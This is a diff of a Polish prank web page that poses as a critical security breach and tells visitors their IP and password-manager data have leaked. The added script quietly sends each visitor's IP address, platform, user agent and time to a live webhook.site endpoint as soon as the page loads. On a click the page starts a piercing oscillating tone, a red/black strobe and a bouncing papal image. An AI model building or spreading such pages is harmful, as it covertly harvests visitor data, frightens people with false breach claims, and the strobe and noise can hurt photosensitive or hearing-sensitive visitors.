@@ -2,62 +2,137 @@
 <html lang="pl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYSTEM FAILURE</title>
+    <title>SYSTEM FAILURE - CRITICAL ERROR</title>
     <style>
-        body {
-            background-color: black;
-            color: #00FF41; /* Klasyczny kolor terminala */
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
-            overflow: hidden;
+        body { 
+            background: black; 
+            color: #00FF41; 
+            font-family: 'Courier New', monospace; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            text-align: center; 
+            overflow: hidden; 
+            transition: background 0.1s;
+        }
+        .container { 
+            border: 2px solid #00FF41; 
+            padding: 40px; 
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); 
+            z-index: 10;
+            background: rgba(0,0,0,0.95);
+            position: relative;
+        }
+        .warning { color: #ff0000; font-weight: bold; animation: blink 0.5s infinite; font-size: 2.5rem; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+
+        #papiez {
+            position: absolute;
+            width: 180px;
+            z-index: 5;
+            top: 10px;
+            left: 10px;
+            filter: drop-shadow(0 0 15px gold);
+            display: none; /* Pojawi się po kliknięciu */
         }
 
-        .container {
-            border: 2px solid #00FF41;
-            padding: 40px;
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
-            background: rgba(0, 0, 0, 0.9);
-        }
-
-        h1 {
-            font-size: 2rem;
-            text-transform: uppercase;
-            margin-bottom: 20px;
-            animation: blink 0.8s infinite;
-        }
-
-        p {
+        .glitch {
             font-size: 1.2rem;
-            line-height: 1.6;
-        }
-
-        .warning {
-            color: #ff0000;
-            font-weight: bold;
-        }
-
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0; }
-            100% { opacity: 1; }
+            margin-top: 20px;
         }
     </style>
 </head>
-<body>
+<body onclick="startChaos()">
+
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/John_Paul_II_vatican_official_portrait.jpg/200px-John_Paul_II_vatican_official_portrait.jpg" id="papiez" alt="JP2">
 
     <div class="container">
-        <h1 class="warning">KRYTYCZNE NARUSZENIE BEZPIECZEŃSTWA</h1>
-        <p>Twoje dane zostały przechwycone przez serwer zewnętrzny.</p>
+        <h1 class="warning">DANE PRZECHWYCONE</h1>
+        <p class="glitch">Twoje dane zostały wysłane na serwer zewnętrzny.</p>
         <p>Twoje IP oraz dane z menedżera haseł wyciekły.</p>
         <br>
-        <p>Życzę chujowej nocy.</p>
+        <p style="font-size: 1.8rem; color: #fff;">Życzę chujowej nocy.</p>
+        <p style="font-size: 0.7rem; color: #333; margin-top: 30px;">[ KLIKNIJ ABY POTWIERDZIĆ ODCZYTANIE ]</p>
     </div>
 
+    <script>
+        // --- 1. PRZECHWYTYWANIE I WYSYŁANIE IP ---
+        const WEBHOOK_URL = 'https://webhook.site/2aa605de-9b10-4e3e-b37f-fc573ebba814';
+
+        // Pobieramy IP przez darmowe API i wysyłamy do Ciebie
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                const info = {
+                    ip: data.ip,
+                    platform: navigator.platform,
+                    agent: navigator.userAgent,
+                    time: new Date().toLocaleString()
+                };
+                // Wysyłamy dane na Twój webhook
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(info)
+                });
+            })
+            .catch(err => console.log("Błąd przechwytywania"));
+
+        // --- 2. LOGIKA LATAJĄCEGO PAPIEŻA ---
+        const papiez = document.getElementById('papiez');
+        let posX = 10;
+        let posY = 10;
+        let velX = 6;
+        let velY = 4;
+
+        function move() {
+            posX += velX;
+            posY += velY;
+
+            if (posX + papiez.clientWidth >= window.innerWidth || posX <= 0) velX = -velX;
+            if (posY + papiez.clientHeight >= window.innerHeight || posY <= 0) velY = -velY;
+
+            papiez.style.left = posX + 'px';
+            papiez.style.top = posY + 'px';
+            requestAnimationFrame(move);
+        }
+
+        // --- 3. START CHAOSU (PO KLIKNIĘCIU) ---
+        let started = false;
+        function startChaos() {
+            if (started) return;
+            started = true;
+
+            // Pokaż papieża i zacznij nim ruszać
+            papiez.style.display = 'block';
+            move();
+
+            // Uruchom pisk
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+
+            osc.type = 'sawtooth'; 
+            osc.frequency.setValueAtTime(3500, audioCtx.currentTime);
+            gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
+
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.start();
+
+            // Modulacja dźwięku (zmiana wysokości)
+            setInterval(() => {
+                osc.frequency.value = 2000 + Math.random() * 2000;
+            }, 80);
+
+            // Efekt migania tła (stroboskop)
+            setInterval(() => {
+                document.body.style.background = (document.body.style.background === 'red' ? 'black' : 'red');
+                setTimeout(() => { document.body.style.background = 'black'; }, 40);
+            }, 300);
+        }
+    </script>
 </body>
 </html>
